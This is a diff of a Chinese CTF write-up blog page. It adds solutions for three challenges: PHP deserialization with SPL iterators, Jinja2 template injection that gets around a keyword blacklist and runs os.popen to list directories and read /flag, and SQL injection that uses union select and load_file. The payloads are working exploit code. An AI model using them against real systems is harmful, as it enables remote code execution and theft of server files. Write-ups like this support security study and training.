@@ -459,7 +459,55 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="ez-serialize"><a href="#ez-serialize" class="headerlink" title="ez_serialize"></a>ez_serialize</h3><h3 id="baby-flask"><a href="#baby-flask" class="headerlink" title="baby_flask"></a>baby_flask</h3><p>黑名单</p>
+                <h3 id="ez-serialize"><a href="#ez-serialize" class="headerlink" title="ez_serialize"></a>ez_serialize</h3><p>源码</p>
+<pre><code></code></pre>
+<p>PHP标准库</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/book.spl.php">https://www.php.net/manual/zh/book.spl.php</a></p>
+<p>SLP类中存在能够进行文件处理和迭代的类：</p>
+<table>
+<thead>
+<tr>
+<th>类</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>DirectoryIterator</td>
+<td>遍历目录</td>
+</tr>
+<tr>
+<td>FilesystemIterator</td>
+<td>遍历目录</td>
+</tr>
+<tr>
+<td>GlobIterator</td>
+<td>遍历目录，但是不同的点在于它可以通配例如/var/html/www/flag*</td>
+</tr>
+<tr>
+<td>SplFileObject</td>
+<td>读取文件，按行读取，多行需要遍历</td>
+</tr>
+</tbody></table>
+<p>exp</p>
+<p>直接读取/var/www/html下面的文件</p>
+<pre><code>&lt;?php
+class A&#123;
+    public $class=&#39;FilesystemIterator&#39;;
+    public $para=&quot;/var/www/html&quot;;
+    public $check;
+    &#125;
+$a  = new A();
+echo serialize($a);</code></pre>
+<pre><code>&lt;?php
+class A&#123;
+    public $class=&#39;SplFileObject&#39;;
+    public $para=&quot;/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&quot;;
+    public $check;
+    &#125;
+
+$a  = new A();
+echo serialize($a);</code></pre>
+<h3 id="baby-flask"><a href="#baby-flask" class="headerlink" title="baby_flask"></a>baby_flask</h3><p>黑名单</p>
 <pre><code>blacklist&lt;/br&gt;   
 &#39;.&#39;,&#39;[&#39;,&#39;\&#39;&#39;,&#39;&quot;&#39;,&#39;&#39;\\&#39;,&#39;+&#39;,&#39;:&#39;,&#39;_&#39;,&lt;/br&gt;   
 &#39;chr&#39;,&#39;pop&#39;,&#39;class&#39;,&#39;base&#39;,&#39;mro&#39;,&#39;init&#39;,&#39;globals&#39;,&#39;get&#39;,&lt;/br&gt;   
@@ -490,7 +538,7 @@
 (lipsum|string|list)[18] &lt;=&gt; (lipsum|string|list).pop(18)</code></pre>
 <p><img src="/images/67.png"></p>
 <p>最终payload</p>
-<pre><code>&#123;% set id=dict(ind=a,ex=a)|join%&#125;
+<pre><code>1&#123;% set id=dict(ind=a,ex=a)|join%&#125;
 &#123;% set pp=dict(po=a,p=a)|join%&#125;
 &#123;% set ls=dict(ls=a)|join%&#125;
 &#123;% set ppe=dict(po=a,pen=a)|join%&#125;
@@ -513,10 +561,31 @@
 &#123;% set space=chcr(three*three*five-five-five-three) %&#125;
 &#123;% set shell=(ls,space,xiegang,dict(var=a)|join,xiegang,dict(www=a)|join,xiegang,dict(flask=a)|join)|join %&#125;
 &#123;&#123;(lipsum|attr(gb))|attr(gt)(ooqq)|attr(ppe)(shell)|attr(rd)()&#125;&#125;
-==
-lipsum.__globals__.get(&#39;__builtins__&#39;).os.popen(&#39;ls /var/www/flask&#39;).read()
-注：
-&#123;% set chcr=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;需要get获取</code></pre>
+</code></pre>
+<p><strong>方法2</strong></p>
+<p>python3支持unicode编码</p>
+<pre><code>测试的使用&#123;%print 𝟡%&#125;如果可以正常回显就代表支持</code></pre>
+<p>参考文章</p>
+<p><a target="_blank" rel="noopener" href="http://www.plasf.cn/articles/dasctf202103.html">http://www.plasf.cn/articles/dasctf202103.html</a></p>
+<p>这个网站有各种各样的unicode编码方式</p>
+<p><a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode/bidiclass/EN">https://www.compart.com/en/unicode/bidiclass/EN</a></p>
+<p><img src="/images/68.png"></p>
+<p><img src="/images/69.png"></p>
+<pre><code>&#123;%set a=dict(po=aa,p=aa)|join%&#125; # pop
+&#123;%set b=lipsum|string|list|attr(a)(𝟙𝟠)%&#125; # _
+&#123;%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%&#125; # globals
+&#123;%set d=(b,b,dict(ge=cc,tit=dd,em=aa)|join,b,b)|join%&#125; # getitem
+&#123;%set e=dict(o=cc,s=aa)|join%&#125; # os
+&#123;%set f=lipsum|string|list|attr(a)(𝟡)%&#125; # 空格
+&#123;%set g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟠)%&#125; # 斜杠
+&#123;%set i=(dict(cat=aa)|join,f,g,dict(flag=aa)|join)|join%&#125; # cat /flag
+&#123;%set h=(a,dict(en=aa)|join|join)|join%&#125; # popen
+&#123;%set i=dict(re=aa,ad=aa)|join%&#125; # read
+&#123;%set z=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟝)%&#125; #点
+&#123;%set j=(dict(ls=aa)|join,f,g,(dict(var=aa)|join),g,(dict(www=aa)|join),g,(dict(flask=aa)|join)|join)|join%&#125; #ls /var/www/flask
+&#123;%print (((lipsum|attr(c))|attr(d)(e))|attr(h)(j))|attr(i)()%&#125;&#123;&#123;j&#125;&#125;
+#最后拼接起来
+#&#123;&#123;lipsum.__globals__['os'].popen('ls /var/www/flask').read()&#125;&#125;</code></pre>
 <p><a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/en/2.11.x/templates/">jinja2官方文档</a></p>
 <pre><code>&#123;%%&#125;可以用来声明变量，当然也可以用于循环语句和条件语句。
 &#123;&#123;&#125;&#125;用于将表达式打印到模板输出
@@ -772,10 +841,23 @@ Returns a list of unique items from the given iterable.</code></pre>
 <pre><code>(()|select|string|list).__getitem__(24)~
 (()|select|string|list).pop(24)~
 (()|select|string|list)|attr(&#39;__getitem__&#39;)(15)~</code></pre>
+<h3 id="bsetDB"><a href="#bsetDB" class="headerlink" title="bsetDB"></a>bsetDB</h3><p>这题没做过，服务器直接崩掉。看了别人的wp，难度容易。</p>
+<p>考点：联合查询+load_file文件读取</p>
+<p>注释中给了sql查询句子。</p>
+<pre><code>&lt;!-- SELECT * FROM users WHERE id = &#39;$query&#39; OR username = \&quot;$query\&quot; --!&gt;</code></pre>
+<p>过滤了单引号，空格。但双引号没有被ban</p>
+<p>绕过空格的方法挺多的，不列举了。</p>
+<pre><code>l&quot;/**/union/**/select/**/1,2,3#
+接下去就是日常查表，查字段，查数据。
+回显出flag.txt 但听说文件在/flag里
+
+读数据了这里使用load_file()函数
+l&quot;/**/union/**/select/**/(select/**/load_file(0x2f666c6167)),2,3#</code></pre>
 <p>参考：</p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/113866139">https://blog.csdn.net/rfrder/article/details/113866139</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/110220425">https://blog.csdn.net/miuzzx/article/details/110220425</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/115272645">https://blog.csdn.net/rfrder/article/details/115272645</a></p>
+<p><a target="_blank" rel="noopener" href="https://shimo.im/docs/lf9OcEmdH70MC17f">https://shimo.im/docs/lf9OcEmdH70MC17f</a></p>
 
             </div>
             <hr/>
